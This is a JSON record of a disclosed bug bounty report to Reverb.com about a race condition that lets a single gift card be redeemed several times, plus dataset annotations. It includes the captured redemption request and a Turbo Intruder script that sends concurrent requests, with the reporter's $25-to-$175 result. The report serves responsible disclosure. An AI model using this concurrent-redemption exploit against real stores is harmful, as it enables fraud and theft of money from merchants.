{
    "reported_to": "Reverb.com",
    "reported_by": "muon4 ",
    "title": "Race Condition allows to redeem multiple times gift cards which leads to free \"money\"",
    "content": "\nHello team!\nI've found a Race Condition vulnerability which allows to redeem gift cards multiple times. This how a s/he can easily buy stuff just bying one gift card and redeem it over and over again.\nSteps to reproduce\nPreparations\nBurp Suite Pro\nTurbo Intruder\nNote: This also can be reproduced other way but this is maybe the easiest\nThe attack\nLogin\nBuy a gift card\nNow redeem it at https://sandbox.reverb.com/<lang>/redeem\nIntercept the request which will be following:\nCode 504 Bytes\n1POST /fi/redeem HTTP/1.1\n2Host: sandbox.reverb.com\n3User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0\n4Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\n5Accept-Language: en-US,en;q=0.5\n6Accept-Encoding: gzip, deflate\n7Referer: https://sandbox.reverb.com/fi/redeem\n8Content-Type: application/x-www-form-urlencoded\n9Content-Length: 176\n10Connection: keep-alive\n11Cookie: <cookies>\n12\n13utf8=%E2%9C%93&authenticity_token=<CSRF token>&token=<GIFT card>&commit=Redeem+Now\nSend it to the turbo intruder\nUse this python code as a payload of the turbo intruder\nCode 532 Bytes\n1def queueRequests(target, wordlists):\n2    engine = RequestEngine(endpoint=target.endpoint,\n3                           concurrentConnections=30,\n4                           requestsPerConnection=30,\n5                           pipeline=False\n6                           )\n7\n8   for i in range(30):\n9\tengine.queue(target.req, i)\n10        engine.queue(target.req, target.baseInput, gate='race1')\n11\n12\n13    engine.start(timeout=5)\n14   engine.openGate('race1')\n15\n16    engine.complete(timeout=60)\n17\n18\n19def handleResponse(req, interesting):\n20\ttable.add(req)\nNow set the external HTTP header x-request: %s - This is needed by the turbo intruder\nClick \"Attack\"\nSee multiple 200 OK responses:\n<image_0>\nCheck your Reverb bucks and see that you have a way more money than the gift card actually was worth of:\n<image_1>\nIn my case I bought one gift card which was worth of 25$ and as we can see from the picture I was able to redeem it 7 times which makes 25*7 = 175$.\nIf you need any information please let me know.\nCheers!\nImpact\nRace Condition can be used for get almost free stuff and steal money.\n\n",
    "severity": [
        7.0,
        8.9
    ],
    "bounty": null,
    "weaknesses": [
        "Business Logic Errors"
    ],
    "screenshots": {
        "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/zbsPW6ZG2f8wPoNwQTZSo3fB?response-content-disposition=attachment%3B%20filename%3D%22reverb-ti.png%22%3B%20filename%2A%3DUTF-8%27%27reverb-ti.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYLEKYDFX%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T015238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC4vODn8YUzaTRUfcGpvJJTBgHwUK5fDHwdpePaibJ5vwIhANQs5y7y0XMxGnZ34oIb1sUwP9aYibzxtKLOY4j8kdkAKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5Igxs%2FvQpiWvF5gA0%2Bl4qjgX4Kn26dc27l0jkuHHWSiUdWdQFjZqqpzFO3M8nHWZLgzKxeMYt7LsD7%2B66VkYc3oB7e%2F3DMjgufrIIQp7gV5DghgpuKsuvqSZbbT2roHrBdjCznDyU9S13b0%2BPAMqC1q1SdJ7eZ8vbkmPXp3MIQXWnlT6jteSrpijdu5ipsxuCuFwvXARdohv2CDwJuIoIrKStWUGTzvLoZOC%2FRk1s89eBabEkMRa01KSNn3HrPum7PFBpUsecTxws8NQETMS%2B3aqknM6L%2BSiF9FPtq8YKbqQDi3s4vLbVCCYmolhF%2BeHIr8f%2BWIGp581jJcaTG1EJtNZBR%2BdTnt%2BxPE%2BL6R9Nrbj%2FRGAL2EBNnNWZ%2F6HQdcez%2F89p52fFJEj8fEs5BqN%2BB3m8MCNlUMu0GRnWu%2FnZpHqedG7WoCOwJb%2FMgdQGpYy0ZeXsMggHNAqJxbN3PHtH0dhab00%2B6JgN1FTeXJni%2FjkGfKiZdp1WigYKWggl0f06Or21Qh4ZnMtxCoclSlvNv%2FeIKr3EE3tPW2YKPA2LlPw22gVEwseBCMi6LPo34asoU6efxREeW4zyCEkMWnreRxBTRMkSBQptd2CqyavwGNEhSlg592iZlrPNAuRM7gXvHCRYABe6anZ8dQl%2BbvStnqJ%2FjbH4OEtW3e0%2Bn1g4THdLAfmHjc0PHkKVqRuOIemXT7kpafIRsniIyVT%2BXrmaapkfd1qdjfzX5xrSkbCR8ZMgU1SBdjIpEwHVzy392oQ12J3HTJGth3YszCQyEEfw7TvkzUMQR5mHTBEyQhOs6I8zBMeLwro97OSiq%2F6Q%2Bl%2F3Ect%2FgO7yxgRElq7ZgbMP7USEzOhTsaFqq9ukwYcSNn3rMdTh8ahC8FXcYSVOULAwjduMvwY6sAHqC%2FkPBuJHzV1lqMeRohNquVKN9GLvdF8dFMEefEIK7wIDWCvhn%2B3pHbbbVkq242RPViMtZRJA30%2FTnkGmg27xFGycA8wLC33KQUqq%2BSc6xoqdWJXf%2FzLEKfLdo2Zf4AJI%2F24AjT945xIvdSUW%2F3P1W2inQKYawdwcCYKBw1rQroD%2BDevAK%2F1i%2B%2Bg4rp8QxnzwzVksNi%2BTCJBMaCiAcxC8Dq6u%2FA0%2FkrVS3qupNHniPw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=521ac97a96e9ea8eb02510ac6a13eff1f922d37b48fb22d33eed5df77a571c6a",
        "image_1": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/srnH4jsmfXQyVhLAHW1ZJ3Ta?response-content-disposition=attachment%3B%20filename%3D%22reverb.png%22%3B%20filename%2A%3DUTF-8%27%27reverb.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQYLEKYDFX%2F20250326%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250326T015238Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELf%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJIMEYCIQC4vODn8YUzaTRUfcGpvJJTBgHwUK5fDHwdpePaibJ5vwIhANQs5y7y0XMxGnZ34oIb1sUwP9aYibzxtKLOY4j8kdkAKrEFCCAQAxoMMDEzNjE5Mjc0ODQ5Igxs%2FvQpiWvF5gA0%2Bl4qjgX4Kn26dc27l0jkuHHWSiUdWdQFjZqqpzFO3M8nHWZLgzKxeMYt7LsD7%2B66VkYc3oB7e%2F3DMjgufrIIQp7gV5DghgpuKsuvqSZbbT2roHrBdjCznDyU9S13b0%2BPAMqC1q1SdJ7eZ8vbkmPXp3MIQXWnlT6jteSrpijdu5ipsxuCuFwvXARdohv2CDwJuIoIrKStWUGTzvLoZOC%2FRk1s89eBabEkMRa01KSNn3HrPum7PFBpUsecTxws8NQETMS%2B3aqknM6L%2BSiF9FPtq8YKbqQDi3s4vLbVCCYmolhF%2BeHIr8f%2BWIGp581jJcaTG1EJtNZBR%2BdTnt%2BxPE%2BL6R9Nrbj%2FRGAL2EBNnNWZ%2F6HQdcez%2F89p52fFJEj8fEs5BqN%2BB3m8MCNlUMu0GRnWu%2FnZpHqedG7WoCOwJb%2FMgdQGpYy0ZeXsMggHNAqJxbN3PHtH0dhab00%2B6JgN1FTeXJni%2FjkGfKiZdp1WigYKWggl0f06Or21Qh4ZnMtxCoclSlvNv%2FeIKr3EE3tPW2YKPA2LlPw22gVEwseBCMi6LPo34asoU6efxREeW4zyCEkMWnreRxBTRMkSBQptd2CqyavwGNEhSlg592iZlrPNAuRM7gXvHCRYABe6anZ8dQl%2BbvStnqJ%2FjbH4OEtW3e0%2Bn1g4THdLAfmHjc0PHkKVqRuOIemXT7kpafIRsniIyVT%2BXrmaapkfd1qdjfzX5xrSkbCR8ZMgU1SBdjIpEwHVzy392oQ12J3HTJGth3YszCQyEEfw7TvkzUMQR5mHTBEyQhOs6I8zBMeLwro97OSiq%2F6Q%2Bl%2F3Ect%2FgO7yxgRElq7ZgbMP7USEzOhTsaFqq9ukwYcSNn3rMdTh8ahC8FXcYSVOULAwjduMvwY6sAHqC%2FkPBuJHzV1lqMeRohNquVKN9GLvdF8dFMEefEIK7wIDWCvhn%2B3pHbbbVkq242RPViMtZRJA30%2FTnkGmg27xFGycA8wLC33KQUqq%2BSc6xoqdWJXf%2FzLEKfLdo2Zf4AJI%2F24AjT945xIvdSUW%2F3P1W2inQKYawdwcCYKBw1rQroD%2BDevAK%2F1i%2B%2Bg4rp8QxnzwzVksNi%2BTCJBMaCiAcxC8Dq6u%2FA0%2FkrVS3qupNHniPw%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=03c1fcb8d880fb26906f1056a9e55bba07c05acedfa38d470ce9db244e171547"
    },
    "disclosed_date": 1579993080,
    "report_url": "https://hackerone.com/reports/759247",
    "is_multi_component": true,
    "complexity": "HIGH",
    "novelty": "HIGH",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Login to the application and purchase a gift card."
        ],
        [
            2,
            "Intercept the redemption request using Burp Suite and send it to Turbo Intruder with a race condition payload to execute multiple concurrent requests."
        ]
    ],
    "vuln_description": "A race condition vulnerability allows users to redeem a single gift card multiple times by sending concurrent requests during the redemption process, effectively multiplying the gift card's value.",
    "reason": "The attack requires setting up concurrent requests with specific timing, but the core vulnerability is straightforward once the race condition is identified. The use of tools like Burp Suite and Turbo Intruder is common in testing for such issues.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}